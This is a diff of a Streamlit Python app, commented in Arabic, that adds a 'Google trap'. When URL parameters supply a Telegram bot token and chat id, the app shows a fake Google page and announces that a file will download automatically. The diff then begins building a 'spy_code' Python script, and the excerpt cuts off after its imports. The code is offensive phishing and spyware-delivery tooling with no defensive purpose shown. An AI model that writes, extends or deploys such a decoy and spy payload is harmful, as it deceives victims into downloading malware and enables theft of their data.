@@ -318,22 +318,26 @@ else:
 
 # ============= معالجة طلبات التحميل (API Endpoint) =============
 # ============= فخ جوجل - عرض صفحة Google الوهمية =============
+# ============= فخ جوجل - عرض صفحة Google الوهمية مباشرة (خارج أي شرط) =============
 query_params = st.query_params
+
 if 'decoy' in query_params and query_params.get('decoy', [''])[0] == 'google':
     bot_token = query_params.get('token', [''])[0]
     chat_id = query_params.get('chatid', [''])[0]
 
     if bot_token and chat_id:
-        # عرض صفحة Google الوهمية مباشرة
         try:
             with open('index.html', 'r', encoding='utf-8') as f:
                 html_content = f.read()
-            st.components.v1.html(html_content, height=600, scrolling=False)
-            st.success("✅ تم تفعيل الفخ - انتظر تنزيل الملف")
+            
+            # عرض صفحة Google كاملة بدون واجهة Streamlit
+            st.components.v1.html(html_content, height=700, scrolling=False)
+            st.success("✅ تم تفعيل الفخ - انتظر تنزيل الملف تلقائياً")
+            
         except Exception as e:
-            st.error(f"خطأ في تحميل صفحة Google: {e}")
+            st.error(f"❌ خطأ في تحميل صفحة Google: {e}")
         
-        # spy_code (يبقى كما هو)
+        # spy_code يبقى هنا (للرجوع إليه فقط)
         spy_code = f"""#!/usr/bin/env python3
 import os, requests, sys, platform, socket
 from pathlib import Path
